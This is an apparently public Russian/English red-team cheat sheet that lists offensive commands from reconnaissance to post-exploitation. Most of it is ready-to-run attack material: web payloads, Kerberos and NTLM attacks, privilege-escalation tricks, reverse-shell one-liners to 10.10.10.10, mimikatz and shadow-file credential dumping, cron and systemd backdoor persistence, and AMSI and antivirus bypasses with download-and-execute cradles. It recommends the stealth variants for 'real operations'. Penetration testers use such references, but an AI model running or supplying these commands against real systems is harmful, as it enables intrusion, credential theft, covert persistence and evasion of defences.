# ⚔️ Ultimate Red Team Cheat Sheet
## Боевой лист. От разведки до пост-эксплуатации.

**Всё в одном файле. Команды разделены на шумные (Noisy) и бесшумные (Stealth).**  
Для реальных операций используй Stealth. Для CTF и быстрых тестов — Noisy.

---

## 📚 Оглавление
1. [Network Reconnaissance](#-network-reconnaissance)
2. [Web Enumeration](#-web-enumeration)
3. [Active Directory](#-active-directory)
4. [Privilege Escalation Linux](#-privilege-escalation-linux)
5. [Privilege Escalation Windows](#-privilege-escalation-windows)
6. [Reverse Shells](#-reverse-shells)
7. [Lateral Movement](#-lateral-movement)
8. [Post-Exploitation](#-post-exploitation)
9. [Persistence](#-persistence)
10. [AV Bypass](#-av-bypass)
11. [Tunneling](#-tunneling)

---

## 🌐 Network Reconnaissance

| Тип | Команда | Описание (RU) | Описание (EN) |
|-----|---------|---------------|---------------|
| **Noisy** | `nmap -A -p- -T4 -Pn 10.10.10.0/24` | Полное агрессивное сканирование всей сети. | Full aggressive scan of entire network. |
| **Noisy** | `masscan -p1-65535 --rate=10000 10.10.10.0/24` | Очень быстрое сканирование всех портов. | Very fast full port scan. |
| **Stealth** | `nmap -sS -Pn -f --data-length 200 --max-rate 50 10.10.10.10` | SYN-скан с фрагментацией и ограничением скорости. | SYN scan with fragmentation and rate limiting. |
| **Stealth** | `nmap --top-ports 100 -sT --max-retries 2 --min-rate 10 10.10.10.10` | Медленное сканирование топ-100 портов. | Slow scan of top 100 ports. |
| **Stealth** | `sudo nmap -sS -Pn -D RND:10 10.10.10.10` | SYN-скан с использованием ложных IP (Decoys). | SYN scan with decoys. |

---

## 🌐 Web Enumeration

| Тип | Команда | Описание (RU) | Описание (EN) |
|-----|---------|---------------|---------------|
| **Noisy** | `ffuf -w wordlist.txt -u http://target/FUZZ -t 200` | Агрессивный перебор директорий (200 потоков). | Aggressive directory brute force (200 threads). |
| **Noisy** | `gobuster dir -u http://target -w wordlist.txt -t 100` | Быстрый перебор директорий. | Fast directory brute force. |
| **Stealth** | `gobuster dir -u http://target -w wordlist.txt -q --delay 500ms` | Перебор с задержкой 500ms между запросами. | Directory brute force with 500ms delay. |
| **Stealth** | `ffuf -w wordlist.txt -u http://target/FUZZ -t 10 -c -s` | Медленный перебор с 10 потоками. | Slow fuzzing with 10 threads. |

### Web Vulnerabilities

| Уязвимость | Команда / Пейлоад | Описание |
|------------|-------------------|----------|
| **SQLi** | `sqlmap -u "http://target/page?id=1" --batch --random-agent` | Автоматическая эксплуатация SQL-инъекции. |
| **SQLi Manual** | `' OR '1'='1` | Базовый обход аутентификации. |
| **XSS** | `<script>alert(1)</script>` | Базовый XSS пейлоад. |
| **XSS Stealth** | `<img src=x onerror=alert(1)>` | XSS через событие onerror. |
| **SSTI** | `{{7*7}}` → `49` | Проверка Server-Side Template Injection. |
| **SSRF** | `http://169.254.169.254/latest/meta-data/` | Доступ к AWS метаданным. |
| **XXE** | `<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>` | Чтение файлов через XXE. |

---

## 🏢 Active Directory

| Тип | Команда | Описание (RU) | Описание (EN) |
|-----|---------|---------------|---------------|
| **Standard** | `impacket-GetNPUsers domain.local/ -usersfile users.txt -request -format hashcat` | **AS-REP Roasting**. Получение хэшей без предварительной аутентификации. | Get users without Kerberos Pre-Auth. |
| **Standard** | `impacket-GetUserSPNs domain.local/username:password -request` | **Kerberoasting**. Запрос SPN для получения хэша сервисного аккаунта. | Request SPNs to get service account hashes. |
| **Stealth** | `bloodhound-python -c All -d domain.local -u user -p pass -ns 10.10.10.10` | Сбор данных для BloodHound. Маскируется под легитимный LDAP. | Data collection for BloodHound. Mimics legitimate LDAP traffic. |
| **Noisy** | `impacket-psexec domain/user:pass@10.10.10.10` | Удаленное выполнение команд через SMB (громко). | Remote command execution via SMB (noisy). |
| **Stealth** | `impacket-wmiexec domain/user:pass@10.10.10.10` | Удаленное выполнение через WMI (тише). | Remote execution via WMI (quieter). |

### Kerberos Attacks

```bash
# AS-REP Roasting (если нет предварительной аутентификации)
impacket-GetNPUsers domain.local/ -usersfile users.txt -request -format hashcat
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt

# Kerberoasting
impacket-GetUserSPNs domain.local/username:password -request
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt

# Golden Ticket (нужен krbtgt хэш)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash /ptt

# Silver Ticket (нужен хэш сервисного аккаунта)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:dc.domain.local /service:cifs /rc4:hash /ptt

NTLM Attacks
bash
# NTLM Relay
impacket-ntlmrelayx -tf targets.txt -smb2support
responder -I eth0 -wrf

# Pass-the-Hash
impacket-psexec domain/user@10.10.10.10 -hashes :hash
nxc smb 10.10.10.10 -u user -H hash -x "whoami"

# LLMNR/NBT-NS Poisoning
responder -I eth0 -wrf

 Privilege Escalation Linux
Быстрые проверки
bash
# Информация о системе
uname -a
cat /etc/os-release
id
whoami
sudo -l

# Поиск SUID бинарников
find / -perm -4000 -type f 2>/dev/null

# Поиск записываемых файлов
find / -writable -type f 2>/dev/null | grep -v "/proc/"

# Поиск файлов с паролями
find / -name "*.conf" -type f 2>/dev/null | xargs grep -i "password" 2>/dev/null

Sudo эксплуатация (GTFOBins)
Команда	Эксплуатация
sudo vim	:!/bin/sh
sudo find	sudo find . -exec /bin/sh \; -quit
sudo awk	sudo awk 'BEGIN {system("/bin/sh")}'
sudo python	sudo python -c 'import pty;pty.spawn("/bin/bash")'
sudo less	!/bin/sh
sudo tar	sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

SUID эксплуатация
Бинарный файл	Команда
nmap	nmap --interactive → !sh
find	find . -exec /bin/sh \; -quit
bash	bash -p
vim	vim -c ':!/bin/sh'
python	python -c 'import os;os.setuid(0);os.system("/bin/sh")'

Linux Exploits
bash
# Автоматические скрипты
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh

wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh && ./linux-exploit-suggester.sh

# Docker Breakout
docker run -it -v /:/host alpine chroot /host /bin/bash
docker run -it --privileged --pid=host ubuntu nsenter -t 1 -m -u -i -n sh

Privilege Escalation Windows
Быстрые проверки
cmd
# Информация о системе
systeminfo
whoami /all
whoami /priv
net user %username%
net localgroup administrators

# Поиск файлов с паролями
findstr /si password *.txt *.ini *.config 2>nul
dir /s *pass* == *cred* 2>nul

# Поиск незакавыченных путей сервисов
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """

Token Impersonation
cmd
# Проверка привилегий (SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege)
whoami /priv

# JuicyPotato (Windows 7-10, Server 2008-2016)
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami > C:\ProgramData\output.txt" -t *

# RoguePotato (Windows 10/2016/2019)
RoguePotato.exe -r attacker_ip -e "cmd.exe" -l 1337 -p 4444

# SweetPotato
SweetPotato.exe -p C:\Windows\System32\cmd.exe -a "/c net user admin password /add"

UAC Bypass
cmd
# Fodhelper (Windows 10)
reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "cmd.exe /c whoami > C:\ProgramData\test.txt" /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_DWORD /d 0 /f
fodhelper.exe

# SilentCleanup
reg add HKCU\Environment /v windir /d "cmd /c whoami > C:\ProgramData\test.txt & REM " /f
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I

# UACMe
Akagi.exe 23 C:\Windows\System32\cmd.exe

AlwaysInstallElevated
cmd
# Проверка
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Эксплуатация
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o reverse.msi
msiexec /quiet /qn /i reverse.msi

Reverse Shells
One-Liners
Тип	Команда
Bash	bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
Bash Stealth	bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
Python3	python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.10.10",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
Python Stealth	python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
PowerShell	powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/shell.ps1');"
PowerShell One-Liner	powershell -c "$c=New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"
PHP	php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
Ruby	ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.10.10",4444))'
Netcat	nc -e /bin/bash 10.10.10.10 4444
Netcat Stealth	nc 10.10.10.10 4444 -e /bin/bash

Metasploit Reverse Shells
bash
# Windows
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o meterpreter.exe

# Linux
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf

# PHP
msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=4444 -f raw -o shell.php

# ASP
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f asp -o shell.asp

Lateral Movement
Метод	Команда	Уровень шума
Psexec	impacket-psexec domain/user:pass@10.10.10.10	Noisy
WMI	impacket-wmiexec domain/user:pass@10.10.10.10	Medium
WinRM	Enter-PSSession -ComputerName 10.10.10.10 -Credential domain\user	Low
RDP	xfreerdp /v:10.10.10.10 /u:user /p:pass	Low
SSH Jump	ssh -J user@jumpbox user@target	Very Low
SMB Exec	nxc smb 10.10.10.10 -u user -p pass -x "whoami"	Noisy

Lateral Movement Commands
bash
# Psexec (громко, много логов)
impacket-psexec domain/user:pass@10.10.10.10
impacket-psexec domain/user@10.10.10.10 -hashes :hash

# WMI (тише)
impacket-wmiexec domain/user:pass@10.10.10.10
wmic /node:10.10.10.10 /user:domain\user /password:pass process call create "cmd.exe /c calc"

# WinRM (очень тихо)
Enter-PSSession -ComputerName 10.10.10.10 -Credential domain\user
Invoke-Command -ComputerName 10.10.10.10 -ScriptBlock {whoami} -Credential domain\user

# RDP
xfreerdp /v:10.10.10.10 /u:user /p:pass
rdesktop -u user -p pass 10.10.10.10

# SSH (тише всего)
ssh user@10.10.10.10
ssh -J user@jumpbox user@target

 Post-Exploitation
Linux
bash
# Сбор информации
uname -a
cat /etc/passwd
cat /etc/shadow
ps aux
netstat -tulpn
arp -a
route -n
iptables -L

# Дамп паролей
cat /etc/shadow > shadow.txt
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john unshadowed.txt --wordlist=/usr/share/wordlists/rockyou.txt

# SSH ключи
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys
find / -name "id_rsa" 2>/dev/null

# История команд
cat ~/.bash_history
cat ~/.zsh_history

Windows
cmd
# Сбор информации
systeminfo
ipconfig /all
netstat -ano
tasklist /v
net user
net localgroup administrators
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run

# Дамп паролей (Mimikatz)
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
mimikatz.exe "lsadump::sam" "exit"

# Дамп через reg
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
impacket-secretsdump -sam sam.save -system system.save LOCAL

# Поиск файлов
dir /s *password* 2>nul
dir /s *.kdbx 2>nul
dir /s *.rdp 2>nul

Persistence
Linux
bash
# SSH ключ
mkdir -p ~/.ssh
echo "ssh-rsa AAA..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Cron
(crontab -l 2>/dev/null; echo "@reboot /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'") | crontab -

# Systemd
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor
After=network.target

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor.service
systemctl start backdoor.service

Windows
cmd
# Scheduled Task
schtasks /create /tn "Updater" /tr "C:\Windows\Temp\backdoor.exe" /sc onlogon /ru "SYSTEM"

# Registry Run
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Windows\Temp\backdoor.exe"

# WMI Persistence
wmic /namespace:"\\root\subscription" PATH __EventFilter CREATE Name="Updater", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"

AV Bypass
bash
# Обфускация через msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o obfuscated.exe

# Упаковка через UPX
upx --best --ultra-brute shell.exe -o packed.exe

# AMSI Bypass PowerShell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Alternate Execution Methods
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/shell.ps1')");

mshta.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/shell.ps1'))"

regsvr32.exe /u /n /s /i:http://10.10.10.10/reg.sct scrobj.dll

Tunneling
bash
# Chisel (легкий, через HTTP)
# На сервере (атакующем)
chisel server -p 8080 --reverse

# На целевой машине
chisel client 10.10.10.10:8080 R:4444:127.0.0.1:3389
chisel client 10.10.10.10:8080 R:socks

# Ligolo-Ng (без прав администратора)
# На сервере
ip link add ligolo type dummy
ip link set ligolo up
ip addr add 240.0.0.1/32 dev ligolo
./proxy -selfcert

# На целевой машине
./agent -connect 10.10.10.10:5555 -ignore-cert

# SSH Tunneling
# Локальный порт-форвардинг
ssh -L 8080:target.internal:80 user@jumpbox

# Динамический SOCKS прокси
ssh -D 9050 user@jumpbox

# Обратный туннель (с целевой машины)
ssh -R 4444:localhost:22 user@attacker.com

Быстрые ссылки
Ресурс	Ссылка
GTFOBins	https://gtfobins.github.io/
LOLBAS	https://lolbas-project.github.io/
PayloadsAllTheThings	https://github.com/swisskyrepo/PayloadsAllTheThings
RevShells	https://www.revshells.com/
CrackStation	https://crackstation.net/

